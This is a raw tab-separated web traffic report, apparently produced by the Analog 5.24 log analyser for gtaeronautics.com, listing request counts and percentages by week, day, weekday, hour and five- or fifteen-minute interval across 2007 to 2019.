x	VE	analog 5.24
x	HN	gtaeronautics.com
W	Rr	1251	0.164	2009	05	31
W	Rr	1352	0.178	2009	05	24
W	Rr	1133	0.149	2009	05	17
W	Rr	1887	0.248	2009	05	10
W	Rr	1369	0.180	2009	05	03
W	Rr	1089	0.143	2009	04	26
W	Rr	1160	0.152	2009	04	19
W	Rr	1189	0.156	2009	04	12
W	Rr	1529	0.201	2009	04	05
W	Rr	1155	0.152	2009	03	29
W	Rr	1230	0.162	2009	03	22
W	Rr	1029	0.135	2009	03	15
W	Rr	1234	0.162	2009	03	08
W	Rr	1486	0.195	2009	03	01
W	Rr	1470	0.193	2009	02	22
W	Rr	1198	0.157	2009	02	15
W	Rr	1802	0.237	2009	02	08
W	Rr	1653	0.217	2009	02	01
W	Rr	1346	0.177	2009	01	25
W	Rr	1431	0.188	2009	01	18
W	Rr	1678	0.220	2009	01	11
W	Rr	1591	0.209	2009	01	04
W	Rr	886	0.116	2008	12	28
W	Rr	1148	0.151	2008	12	21
W	Rr	1428	0.188	2008	12	14
W	Rr	1508	0.198	2008	12	07
W	Rr	1194	0.157	2008	11	30
W	Rr	1070	0.141	2008	11	23
W	Rr	1396	0.183	2008	11	16
W	Rr	1255	0.165	2008	11	09
W	Rr	1314	0.173	2008	11	02
W	Rr	1397	0.183	2008	10	26
W	Rr	1638	0.215	2008	10	19
W	Rr	1298	0.170	2008	10	12
W	Rr	430	0.056	2008	10	05
W	Rr	723	0.095	2008	09	28
W	Rr	1308	0.172	2008	09	21
W	Rr	1242	0.163	2008	09	14
W	Rr	1409	0.185	2008	09	07
W	Rr	1142	0.150	2008	08	31
W	Rr	1022	0.134	2008	08	24
W	Rr	1062	0.139	2008	08	17
W	Rr	1188	0.156	2008	08	10
W	Rr	1232	0.162	2008	08	03
W	Rr	1050	0.138	2008	07	27
W	Rr	1272	0.167	2008	07	20
W	Rr	1305	0.171	2008	07	13
W	Rr	1093	0.144	2008	07	06
W	Rr	1182	0.155	2008	06	29
W	Rr	1937	0.254	2008	06	22
W	Rr	1493	0.196	2008	06	15
W	Rr	1083	0.142	2008	06	08
W	Rr	1283	0.168	2008	06	01
W	Rr	1432	0.188	2008	05	25
W	Rr	1726	0.227	2008	05	18
W	Rr	1580	0.207	2008	05	11
W	Rr	2661	0.349	2008	05	04
W	Rr	3648	0.479	2008	04	27
W	Rr	1400	0.184	2008	04	20
W	Rr	1365	0.179	2008	04	13
W	Rr	1213	0.159	2008	04	06
W	Rr	1670	0.219	2008	03	30
W	Rr	1211	0.159	2008	03	23
W	Rr	1144	0.150	2008	03	16
W	Rr	1301	0.171	2008	03	09
W	Rr	1292	0.170	2008	03	02
W	Rr	1427	0.187	2008	02	24
W	Rr	2207	0.290	2008	02	17
W	Rr	1124	0.148	2008	02	10
W	Rr	1561	0.205	2008	02	03
W	Rr	1533	0.201	2008	01	27
W	Rr	1389	0.182	2008	01	20
W	Rr	1133	0.149	2008	01	13
W	Rr	1404	0.184	2008	01	06
W	Rr	976	0.128	2007	12	30
W	Rr	801	0.105	2007	12	23
W	Rr	675	0.089	2007	12	16
W	*BT	R	7060	2014	02	16
D	Rr	197	0.026	2019	03	22
D	Rr	287	0.038	2019	03	21
D	Rr	264	0.035	2019	03	20
D	Rr	226	0.030	2019	03	19
D	Rr	195	0.026	2019	03	18
D	Rr	295	0.039	2019	03	17
D	Rr	0	0.000	2019	03	16
D	Rr	254	0.033	2019	03	15
D	Rr	189	0.025	2019	03	14
D	Rr	251	0.033	2019	03	13
D	Rr	234	0.031	2019	03	12
D	Rr	235	0.031	2019	03	11
D	Rr	218	0.029	2019	03	10
D	Rr	0	0.000	2019	03	09
D	Rr	196	0.026	2019	03	08
D	Rr	191	0.025	2019	03	07
D	Rr	343	0.045	2019	03	06
D	Rr	285	0.037	2019	03	05
D	Rr	279	0.037	2019	03	04
D	Rr	333	0.044	2019	03	03
D	Rr	0	0.000	2019	03	02
D	Rr	347	0.046	2019	03	01
D	Rr	301	0.040	2019	02	28
D	Rr	122	0.016	2019	02	27
D	Rr	378	0.050	2019	02	26
D	Rr	335	0.044	2019	02	25
D	Rr	290	0.038	2019	02	24
D	Rr	0	0.000	2019	02	23
D	Rr	373	0.049	2019	02	22
D	Rr	249	0.033	2019	02	21
D	Rr	302	0.040	2019	02	20
D	Rr	327	0.043	2019	02	19
D	Rr	203	0.027	2019	02	18
D	Rr	215	0.028	2019	02	17
D	Rr	0	0.000	2019	02	16
D	Rr	230	0.030	2019	02	15
D	Rr	284	0.037	2019	02	14
D	Rr	240	0.032	2019	02	13
D	Rr	268	0.035	2019	02	12
D	Rr	259	0.034	2019	02	11
D	Rr	202	0.027	2019	02	10
D	Rr	0	0.000	2019	02	09
D	*BT	R	2131	2008	05	03
d	Rr	85227	11.191	Sun
d	Rr	119508	15.693	Mon
d	Rr	123158	16.172	Tue
d	Rr	120450	15.817	Wed
d	Rr	122003	16.021	Thu
d	Rr	114164	14.991	Fri
d	Rr	77024	10.114	Sat
H	Rr	4	0.001	2019	03	22	23
H	Rr	2	0.000	2019	03	22	22
H	Rr	3	0.000	2019	03	22	21
H	Rr	25	0.003	2019	03	22	20
H	Rr	4	0.001	2019	03	22	19
H	Rr	27	0.004	2019	03	22	18
H	Rr	7	0.001	2019	03	22	17
H	Rr	5	0.001	2019	03	22	16
H	Rr	25	0.003	2019	03	22	15
H	Rr	3	0.000	2019	03	22	14
H	Rr	22	0.003	2019	03	22	13
H	Rr	3	0.000	2019	03	22	12
H	Rr	3	0.000	2019	03	22	11
H	Rr	11	0.001	2019	03	22	10
H	Rr	7	0.001	2019	03	22	09
H	Rr	6	0.001	2019	03	22	08
H	Rr	0	0.000	2019	03	22	07
H	Rr	20	0.003	2019	03	22	06
H	Rr	1	0.000	2019	03	22	05
H	Rr	4	0.001	2019	03	22	04
H	Rr	3	0.000	2019	03	22	03
H	Rr	7	0.001	2019	03	22	02
H	Rr	3	0.000	2019	03	22	01
H	Rr	2	0.000	2019	03	22	00
H	Rr	1	0.000	2019	03	21	23
H	Rr	16	0.002	2019	03	21	22
H	Rr	64	0.008	2019	03	21	21
H	Rr	1	0.000	2019	03	21	20
H	Rr	8	0.001	2019	03	21	19
H	Rr	24	0.003	2019	03	21	18
H	Rr	17	0.002	2019	03	21	17
H	Rr	4	0.001	2019	03	21	16
H	Rr	8	0.001	2019	03	21	15
H	Rr	4	0.001	2019	03	21	14
H	Rr	2	0.000	2019	03	21	13
H	Rr	4	0.001	2019	03	21	12
H	Rr	1	0.000	2019	03	21	11
H	Rr	7	0.001	2019	03	21	10
H	Rr	2	0.000	2019	03	21	09
H	Rr	2	0.000	2019	03	21	08
H	Rr	6	0.001	2019	03	21	07
H	Rr	3	0.000	2019	03	21	06
H	Rr	35	0.005	2019	03	21	05
H	Rr	18	0.002	2019	03	21	04
H	Rr	37	0.005	2019	03	21	03
H	Rr	21	0.003	2019	03	21	02
H	Rr	0	0.000	2019	03	21	01
H	Rr	2	0.000	2019	03	21	00
H	Rr	3	0.000	2019	03	20	23
H	Rr	7	0.001	2019	03	20	22
H	Rr	13	0.002	2019	03	20	21
H	Rr	18	0.002	2019	03	20	20
H	Rr	5	0.001	2019	03	20	19
H	Rr	4	0.001	2019	03	20	18
H	Rr	2	0.000	2019	03	20	17
H	Rr	43	0.006	2019	03	20	16
H	Rr	2	0.000	2019	03	20	15
H	Rr	0	0.000	2019	03	20	14
H	Rr	41	0.005	2019	03	20	13
H	Rr	2	0.000	2019	03	20	12
H	Rr	22	0.003	2019	03	20	11
H	Rr	15	0.002	2019	03	20	10
H	Rr	5	0.001	2019	03	20	09
H	Rr	18	0.002	2019	03	20	08
H	Rr	26	0.003	2019	03	20	07
H	Rr	15	0.002	2019	03	20	06
H	Rr	9	0.001	2019	03	20	05
H	Rr	2	0.000	2019	03	20	04
H	Rr	2	0.000	2019	03	20	03
H	Rr	4	0.001	2019	03	20	02
H	Rr	6	0.001	2019	03	20	01
H	Rr	0	0.000	2019	03	20	00
H	*BT	R	634	2008	05	03	04
h	Rr	31243	4.103	00
h	Rr	29400	3.861	01
h	Rr	29264	3.843	02
h	Rr	28819	3.784	03
h	Rr	28686	3.767	04
h	Rr	27025	3.549	05
h	Rr	26247	3.447	06
h	Rr	25405	3.336	07
h	Rr	24874	3.266	08
h	Rr	23948	3.145	09
h	Rr	24173	3.174	10
h	Rr	25938	3.406	11
h	Rr	26899	3.532	12
h	Rr	28641	3.761	13
h	Rr	33144	4.352	14
h	Rr	37126	4.875	15
h	Rr	39837	5.231	16
h	Rr	39672	5.209	17
h	Rr	41352	5.430	18
h	Rr	41559	5.457	19
h	Rr	41160	5.405	20
h	Rr	38535	5.060	21
h	Rr	35838	4.706	22
h	Rr	32749	4.300	23
4	Rr	4	0.001	2019	03	22	23	15
4	Rr	0	0.000	2019	03	22	23	00
4	Rr	0	0.000	2019	03	22	22	45
4	Rr	0	0.000	2019	03	22	22	30
4	Rr	2	0.000	2019	03	22	22	15
4	Rr	0	0.000	2019	03	22	22	00
4	Rr	0	0.000	2019	03	22	21	45
4	Rr	1	0.000	2019	03	22	21	30
4	Rr	2	0.000	2019	03	22	21	15
4	Rr	0	0.000	2019	03	22	21	00
4	Rr	12	0.002	2019	03	22	20	45
4	Rr	3	0.000	2019	03	22	20	30
4	Rr	6	0.001	2019	03	22	20	15
4	Rr	4	0.001	2019	03	22	20	00
4	Rr	1	0.000	2019	03	22	19	45
4	Rr	1	0.000	2019	03	22	19	30
4	Rr	2	0.000	2019	03	22	19	15
4	Rr	0	0.000	2019	03	22	19	00
4	Rr	0	0.000	2019	03	22	18	45
4	Rr	1	0.000	2019	03	22	18	30
4	Rr	2	0.000	2019	03	22	18	15
4	Rr	24	0.003	2019	03	22	18	00
4	Rr	0	0.000	2019	03	22	17	45
4	Rr	2	0.000	2019	03	22	17	30
4	Rr	5	0.001	2019	03	22	17	15
4	Rr	0	0.000	2019	03	22	17	00
4	Rr	2	0.000	2019	03	22	16	45
4	Rr	1	0.000	2019	03	22	16	30
4	Rr	2	0.000	2019	03	22	16	15
4	Rr	0	0.000	2019	03	22	16	00
4	Rr	0	0.000	2019	03	22	15	45
4	Rr	24	0.003	2019	03	22	15	30
4	Rr	0	0.000	2019	03	22	15	15
4	Rr	1	0.000	2019	03	22	15	00
4	Rr	0	0.000	2019	03	22	14	45
4	Rr	0	0.000	2019	03	22	14	30
4	Rr	1	0.000	2019	03	22	14	15
4	Rr	2	0.000	2019	03	22	14	00
4	Rr	1	0.000	2019	03	22	13	45
4	Rr	4	0.001	2019	03	22	13	30
4	Rr	17	0.002	2019	03	22	13	15
4	Rr	0	0.000	2019	03	22	13	00
4	Rr	0	0.000	2019	03	22	12	45
4	Rr	0	0.000	2019	03	22	12	30
4	Rr	1	0.000	2019	03	22	12	15
4	Rr	2	0.000	2019	03	22	12	00
4	Rr	0	0.000	2019	03	22	11	45
4	Rr	2	0.000	2019	03	22	11	30
4	Rr	1	0.000	2019	03	22	11	15
4	Rr	0	0.000	2019	03	22	11	00
4	Rr	1	0.000	2019	03	22	10	45
4	Rr	10	0.001	2019	03	22	10	30
4	Rr	0	0.000	2019	03	22	10	15
4	Rr	0	0.000	2019	03	22	10	00
4	Rr	4	0.001	2019	03	22	09	45
4	Rr	3	0.000	2019	03	22	09	30
4	Rr	0	0.000	2019	03	22	09	15
4	Rr	0	0.000	2019	03	22	09	00
4	Rr	0	0.000	2019	03	22	08	45
4	Rr	0	0.000	2019	03	22	08	30
4	Rr	0	0.000	2019	03	22	08	15
4	Rr	6	0.001	2019	03	22	08	00
4	Rr	0	0.000	2019	03	22	07	45
4	Rr	0	0.000	2019	03	22	07	30
4	Rr	0	0.000	2019	03	22	07	15
4	Rr	0	0.000	2019	03	22	07	00
4	Rr	0	0.000	2019	03	22	06	45
4	Rr	14	0.002	2019	03	22	06	30
4	Rr	6	0.001	2019	03	22	06	15
4	Rr	0	0.000	2019	03	22	06	00
4	Rr	0	0.000	2019	03	22	05	45
4	Rr	0	0.000	2019	03	22	05	30
4	Rr	0	0.000	2019	03	22	05	15
4	Rr	1	0.000	2019	03	22	05	00
4	Rr	0	0.000	2019	03	22	04	45
4	Rr	0	0.000	2019	03	22	04	30
4	Rr	3	0.000	2019	03	22	04	15
4	Rr	1	0.000	2019	03	22	04	00
4	Rr	1	0.000	2019	03	22	03	45
4	Rr	1	0.000	2019	03	22	03	30
4	Rr	0	0.000	2019	03	22	03	15
4	Rr	1	0.000	2019	03	22	03	00
4	Rr	6	0.001	2019	03	22	02	45
4	Rr	0	0.000	2019	03	22	02	30
4	Rr	0	0.000	2019	03	22	02	15
4	Rr	1	0.000	2019	03	22	02	00
4	Rr	2	0.000	2019	03	22	01	45
4	Rr	0	0.000	2019	03	22	01	30
4	Rr	1	0.000	2019	03	22	01	15
4	Rr	0	0.000	2019	03	22	01	00
4	Rr	2	0.000	2019	03	22	00	45
4	Rr	0	0.000	2019	03	22	00	30
4	Rr	0	0.000	2019	03	22	00	15
4	Rr	0	0.000	2019	03	22	00	00
4	Rr	1	0.000	2019	03	21	23	45
4	Rr	0	0.000	2019	03	21	23	30
4	*BT	R	398	2008	05	03	03	30
6	Rr	7727	1.015	00	00
6	Rr	7828	1.028	00	15
6	Rr	7678	1.008	00	30
6	Rr	8010	1.052	00	45
6	Rr	7442	0.977	01	00
6	Rr	7342	0.964	01	15
6	Rr	7342	0.964	01	30
6	Rr	7274	0.955	01	45
6	Rr	7010	0.921	02	00
6	Rr	7833	1.029	02	15
6	Rr	7509	0.986	02	30
6	Rr	6912	0.908	02	45
6	Rr	7147	0.939	03	00
6	Rr	6811	0.894	03	15
6	Rr	7259	0.953	03	30
6	Rr	7602	0.998	03	45
6	Rr	7124	0.935	04	00
6	Rr	7506	0.986	04	15
6	Rr	6691	0.879	04	30
6	Rr	7365	0.967	04	45
6	Rr	6518	0.856	05	00
6	Rr	7096	0.932	05	15
6	Rr	7045	0.925	05	30
6	Rr	6366	0.836	05	45
6	Rr	6777	0.890	06	00
6	Rr	6781	0.890	06	15
6	Rr	6372	0.837	06	30
6	Rr	6317	0.830	06	45
6	Rr	6482	0.851	07	00
6	Rr	6537	0.858	07	15
6	Rr	6573	0.863	07	30
6	Rr	5813	0.763	07	45
6	Rr	6380	0.838	08	00
6	Rr	6044	0.794	08	15
6	Rr	6609	0.868	08	30
6	Rr	5841	0.767	08	45
6	Rr	6030	0.792	09	00
6	Rr	6131	0.805	09	15
6	Rr	6145	0.807	09	30
6	Rr	5642	0.741	09	45
6	Rr	5764	0.757	10	00
6	Rr	5885	0.773	10	15
6	Rr	6177	0.811	10	30
6	Rr	6347	0.833	10	45
6	Rr	7589	0.997	11	00
6	Rr	6132	0.805	11	15
6	Rr	5938	0.780	11	30
6	Rr	6279	0.825	11	45
6	Rr	7433	0.976	12	00
6	Rr	6108	0.802	12	15
6	Rr	6495	0.853	12	30
6	Rr	6863	0.901	12	45
6	Rr	7298	0.958	13	00
6	Rr	6817	0.895	13	15
6	Rr	7587	0.996	13	30
6	Rr	6939	0.911	13	45
6	Rr	8077	1.061	14	00
6	Rr	8256	1.084	14	15
6	Rr	8414	1.105	14	30
6	Rr	8397	1.103	14	45
6	Rr	9097	1.195	15	00
6	Rr	8922	1.172	15	15
6	Rr	9178	1.205	15	30
6	Rr	9929	1.304	15	45
6	Rr	9754	1.281	16	00
6	Rr	9672	1.270	16	15
6	Rr	10080	1.324	16	30
6	Rr	10331	1.357	16	45
6	Rr	9749	1.280	17	00
6	Rr	9961	1.308	17	15
6	Rr	9950	1.307	17	30
6	Rr	10012	1.315	17	45
6	Rr	9674	1.270	18	00
6	Rr	10467	1.374	18	15
6	Rr	10821	1.421	18	30
6	Rr	10390	1.364	18	45
6	Rr	11454	1.504	19	00
6	Rr	9580	1.258	19	15
6	Rr	10325	1.356	19	30
6	Rr	10200	1.339	19	45
6	Rr	10990	1.443	20	00
6	Rr	10108	1.327	20	15
6	Rr	9672	1.270	20	30
6	Rr	10390	1.364	20	45
6	Rr	10063	1.321	21	00
6	Rr	9406	1.235	21	15
6	Rr	9467	1.243	21	30
6	Rr	9599	1.260	21	45
6	Rr	9179	1.205	22	00
6	Rr	9134	1.199	22	15
6	Rr	8915	1.171	22	30
6	Rr	8610	1.131	22	45
6	Rr	9091	1.194	23	00
6	Rr	8326	1.093	23	15
6	Rr	7803	1.025	23	30
6	Rr	7529	0.989	23	45
5	Rr	1	0.000	2019	03	22	23	25
5	Rr	0	0.000	2019	03	22	23	20
5	Rr	3	0.000	2019	03	22	23	15
5	Rr	0	0.000	2019	03	22	23	10
5	Rr	0	0.000	2019	03	22	23	05
5	Rr	0	0.000	2019	03	22	23	00
5	Rr	0	0.000	2019	03	22	22	55
5	Rr	0	0.000	2019	03	22	22	50
5	Rr	0	0.000	2019	03	22	22	45
5	Rr	0	0.000	2019	03	22	22	40
5	Rr	0	0.000	2019	03	22	22	35
5	Rr	0	0.000	2019	03	22	22	30
5	Rr	0	0.000	2019	03	22	22	25
5	Rr	1	0.000	2019	03	22	22	20
5	Rr	1	0.000	2019	03	22	22	15
5	Rr	0	0.000	2019	03	22	22	10
5	Rr	0	0.000	2019	03	22	22	05
5	Rr	0	0.000	2019	03	22	22	00
5	Rr	0	0.000	2019	03	22	21	55
5	Rr	0	0.000	2019	03	22	21	50
5	Rr	0	0.000	2019	03	22	21	45
5	Rr	0	0.000	2019	03	22	21	40
5	Rr	0	0.000	2019	03	22	21	35
5	Rr	1	0.000	2019	03	22	21	30
5	Rr	2	0.000	2019	03	22	21	25
5	Rr	0	0.000	2019	03	22	21	20
5	Rr	0	0.000	2019	03	22	21	15
5	Rr	0	0.000	2019	03	22	21	10
5	Rr	0	0.000	2019	03	22	21	05
5	Rr	0	0.000	2019	03	22	21	00
5	Rr	0	0.000	2019	03	22	20	55
5	Rr	0	0.000	2019	03	22	20	50
5	Rr	12	0.002	2019	03	22	20	45
5	Rr	3	0.000	2019	03	22	20	40
5	Rr	0	0.000	2019	03	22	20	35
5	Rr	0	0.000	2019	03	22	20	30
5	Rr	6	0.001	2019	03	22	20	25
5	Rr	0	0.000	2019	03	22	20	20
5	Rr	0	0.000	2019	03	22	20	15
5	Rr	0	0.000	2019	03	22	20	10
5	Rr	4	0.001	2019	03	22	20	05
5	Rr	0	0.000	2019	03	22	20	00
5	Rr	0	0.000	2019	03	22	19	55
5	Rr	1	0.000	2019	03	22	19	50
5	Rr	0	0.000	2019	03	22	19	45
5	Rr	0	0.000	2019	03	22	19	40
5	Rr	1	0.000	2019	03	22	19	35
5	Rr	0	0.000	2019	03	22	19	30
5	Rr	1	0.000	2019	03	22	19	25
5	Rr	0	0.000	2019	03	22	19	20
5	Rr	1	0.000	2019	03	22	19	15
5	Rr	0	0.000	2019	03	22	19	10
5	Rr	0	0.000	2019	03	22	19	05
5	Rr	0	0.000	2019	03	22	19	00
5	Rr	0	0.000	2019	03	22	18	55
5	Rr	0	0.000	2019	03	22	18	50
5	Rr	0	0.000	2019	03	22	18	45
5	Rr	0	0.000	2019	03	22	18	40
5	Rr	0	0.000	2019	03	22	18	35
5	Rr	1	0.000	2019	03	22	18	30
5	Rr	0	0.000	2019	03	22	18	25
5	Rr	1	0.000	2019	03	22	18	20
5	Rr	1	0.000	2019	03	22	18	15
5	Rr	0	0.000	2019	03	22	18	10
5	Rr	24	0.003	2019	03	22	18	05
5	Rr	0	0.000	2019	03	22	18	00
5	Rr	0	0.000	2019	03	22	17	55
5	Rr	0	0.000	2019	03	22	17	50
5	Rr	0	0.000	2019	03	22	17	45
5	Rr	1	0.000	2019	03	22	17	40
5	Rr	0	0.000	2019	03	22	17	35
5	Rr	1	0.000	2019	03	22	17	30
5	Rr	3	0.000	2019	03	22	17	25
5	Rr	1	0.000	2019	03	22	17	20
5	Rr	1	0.000	2019	03	22	17	15
5	Rr	0	0.000	2019	03	22	17	10
5	Rr	0	0.000	2019	03	22	17	05
5	Rr	0	0.000	2019	03	22	17	00
5	Rr	0	0.000	2019	03	22	16	55
5	Rr	1	0.000	2019	03	22	16	50
5	Rr	1	0.000	2019	03	22	16	45
5	Rr	1	0.000	2019	03	22	16	40
5	Rr	0	0.000	2019	03	22	16	35
5	Rr	0	0.000	2019	03	22	16	30
5	Rr	1	0.000	2019	03	22	16	25
5	Rr	0	0.000	2019	03	22	16	20
5	Rr	1	0.000	2019	03	22	16	15
5	Rr	0	0.000	2019	03	22	16	10
5	Rr	0	0.000	2019	03	22	16	05
5	Rr	0	0.000	2019	03	22	16	00
5	Rr	0	0.000	2019	03	22	15	55
5	Rr	0	0.000	2019	03	22	15	50
5	Rr	0	0.000	2019	03	22	15	45
5	Rr	4	0.001	2019	03	22	15	40
5	Rr	20	0.003	2019	03	22	15	35
5	Rr	0	0.000	2019	03	22	15	30
5	Rr	0	0.000	2019	03	22	15	25
5	Rr	0	0.000	2019	03	22	15	20
5	Rr	0	0.000	2019	03	22	15	15
5	Rr	1	0.000	2019	03	22	15	10
5	Rr	0	0.000	2019	03	22	15	05
5	Rr	0	0.000	2019	03	22	15	00
5	Rr	0	0.000	2019	03	22	14	55
5	Rr	0	0.000	2019	03	22	14	50
5	Rr	0	0.000	2019	03	22	14	45
5	Rr	0	0.000	2019	03	22	14	40
5	Rr	0	0.000	2019	03	22	14	35
5	Rr	0	0.000	2019	03	22	14	30
5	Rr	1	0.000	2019	03	22	14	25
5	Rr	0	0.000	2019	03	22	14	20
5	Rr	0	0.000	2019	03	22	14	15
5	Rr	2	0.000	2019	03	22	14	10
5	Rr	0	0.000	2019	03	22	14	05
5	Rr	0	0.000	2019	03	22	14	00
5	Rr	0	0.000	2019	03	22	13	55
5	Rr	0	0.000	2019	03	22	13	50
5	Rr	1	0.000	2019	03	22	13	45
5	Rr	3	0.000	2019	03	22	13	40
5	Rr	1	0.000	2019	03	22	13	35
5	Rr	0	0.000	2019	03	22	13	30
5	Rr	3	0.000	2019	03	22	13	25
5	Rr	13	0.002	2019	03	22	13	20
5	Rr	1	0.000	2019	03	22	13	15
5	Rr	0	0.000	2019	03	22	13	10
5	Rr	0	0.000	2019	03	22	13	05
5	Rr	0	0.000	2019	03	22	13	00
5	Rr	0	0.000	2019	03	22	12	55
5	Rr	0	0.000	2019	03	22	12	50
5	Rr	0	0.000	2019	03	22	12	45
5	Rr	0	0.000	2019	03	22	12	40
5	Rr	0	0.000	2019	03	22	12	35
5	Rr	0	0.000	2019	03	22	12	30
5	Rr	0	0.000	2019	03	22	12	25
5	Rr	1	0.000	2019	03	22	12	20
5	Rr	0	0.000	2019	03	22	12	15
5	Rr	1	0.000	2019	03	22	12	10
5	Rr	0	0.000	2019	03	22	12	05
5	Rr	1	0.000	2019	03	22	12	00
5	Rr	0	0.000	2019	03	22	11	55
5	Rr	0	0.000	2019	03	22	11	50
5	Rr	0	0.000	2019	03	22	11	45
5	Rr	0	0.000	2019	03	22	11	40
5	Rr	0	0.000	2019	03	22	11	35
5	Rr	2	0.000	2019	03	22	11	30
5	Rr	1	0.000	2019	03	22	11	25
5	Rr	0	0.000	2019	03	22	11	20
5	Rr	0	0.000	2019	03	22	11	15
5	Rr	0	0.000	2019	03	22	11	10
5	Rr	0	0.000	2019	03	22	11	05
5	Rr	0	0.000	2019	03	22	11	00
5	Rr	0	0.000	2019	03	22	10	55
5	Rr	1	0.000	2019	03	22	10	50
5	Rr	0	0.000	2019	03	22	10	45
5	Rr	6	0.001	2019	03	22	10	40
5	Rr	4	0.001	2019	03	22	10	35
5	Rr	0	0.000	2019	03	22	10	30
5	Rr	0	0.000	2019	03	22	10	25
5	Rr	0	0.000	2019	03	22	10	20
5	Rr	0	0.000	2019	03	22	10	15
5	Rr	0	0.000	2019	03	22	10	10
5	Rr	0	0.000	2019	03	22	10	05
5	Rr	0	0.000	2019	03	22	10	00
5	Rr	0	0.000	2019	03	22	09	55
5	Rr	0	0.000	2019	03	22	09	50
5	Rr	4	0.001	2019	03	22	09	45
5	Rr	0	0.000	2019	03	22	09	40
5	Rr	3	0.000	2019	03	22	09	35
5	Rr	0	0.000	2019	03	22	09	30
5	Rr	0	0.000	2019	03	22	09	25
5	Rr	0	0.000	2019	03	22	09	20
5	Rr	0	0.000	2019	03	22	09	15
5	Rr	0	0.000	2019	03	22	09	10
5	Rr	0	0.000	2019	03	22	09	05
5	Rr	0	0.000	2019	03	22	09	00
5	Rr	0	0.000	2019	03	22	08	55
5	Rr	0	0.000	2019	03	22	08	50
5	Rr	0	0.000	2019	03	22	08	45
5	Rr	0	0.000	2019	03	22	08	40
5	Rr	0	0.000	2019	03	22	08	35
5	Rr	0	0.000	2019	03	22	08	30
5	Rr	0	0.000	2019	03	22	08	25
5	Rr	0	0.000	2019	03	22	08	20
5	Rr	0	0.000	2019	03	22	08	15
5	Rr	0	0.000	2019	03	22	08	10
5	Rr	3	0.000	2019	03	22	08	05
5	Rr	3	0.000	2019	03	22	08	00
5	Rr	0	0.000	2019	03	22	07	55
5	Rr	0	0.000	2019	03	22	07	50
5	Rr	0	0.000	2019	03	22	07	45
5	Rr	0	0.000	2019	03	22	07	40
5	Rr	0	0.000	2019	03	22	07	35
5	Rr	0	0.000	2019	03	22	07	30
5	Rr	0	0.000	2019	03	22	07	25
5	Rr	0	0.000	2019	03	22	07	20
5	Rr	0	0.000	2019	03	22	07	15
5	Rr	0	0.000	2019	03	22	07	10
5	Rr	0	0.000	2019	03	22	07	05
5	Rr	0	0.000	2019	03	22	07	00
5	Rr	0	0.000	2019	03	22	06	55
5	Rr	0	0.000	2019	03	22	06	50
5	Rr	0	0.000	2019	03	22	06	45
5	Rr	0	0.000	2019	03	22	06	40
5	Rr	0	0.000	2019	03	22	06	35
5	Rr	14	0.002	2019	03	22	06	30
5	Rr	5	0.001	2019	03	22	06	25
5	Rr	0	0.000	2019	03	22	06	20
5	Rr	1	0.000	2019	03	22	06	15
5	Rr	0	0.000	2019	03	22	06	10
5	Rr	0	0.000	2019	03	22	06	05
5	Rr	0	0.000	2019	03	22	06	00
5	Rr	0	0.000	2019	03	22	05	55
5	Rr	0	0.000	2019	03	22	05	50
5	Rr	0	0.000	2019	03	22	05	45
5	Rr	0	0.000	2019	03	22	05	40
5	Rr	0	0.000	2019	03	22	05	35
5	Rr	0	0.000	2019	03	22	05	30
5	Rr	0	0.000	2019	03	22	05	25
5	Rr	0	0.000	2019	03	22	05	20
5	Rr	0	0.000	2019	03	22	05	15
5	Rr	0	0.000	2019	03	22	05	10
5	Rr	1	0.000	2019	03	22	05	05
5	Rr	0	0.000	2019	03	22	05	00
5	Rr	0	0.000	2019	03	22	04	55
5	Rr	0	0.000	2019	03	22	04	50
5	Rr	0	0.000	2019	03	22	04	45
5	Rr	0	0.000	2019	03	22	04	40
5	Rr	0	0.000	2019	03	22	04	35
5	Rr	0	0.000	2019	03	22	04	30
5	Rr	1	0.000	2019	03	22	04	25
5	Rr	0	0.000	2019	03	22	04	20
5	Rr	2	0.000	2019	03	22	04	15
5	Rr	0	0.000	2019	03	22	04	10
5	Rr	1	0.000	2019	03	22	04	05
5	Rr	0	0.000	2019	03	22	04	00
5	Rr	0	0.000	2019	03	22	03	55
5	Rr	1	0.000	2019	03	22	03	50
5	Rr	0	0.000	2019	03	22	03	45
5	Rr	0	0.000	2019	03	22	03	40
5	Rr	0	0.000	2019	03	22	03	35
5	Rr	1	0.000	2019	03	22	03	30
5	Rr	0	0.000	2019	03	22	03	25
5	Rr	0	0.000	2019	03	22	03	20
5	Rr	0	0.000	2019	03	22	03	15
5	Rr	0	0.000	2019	03	22	03	10
5	Rr	1	0.000	2019	03	22	03	05
5	Rr	0	0.000	2019	03	22	03	00
5	Rr	3	0.000	2019	03	22	02	55
5	Rr	0	0.000	2019	03	22	02	50
5	Rr	3	0.000	2019	03	22	02	45
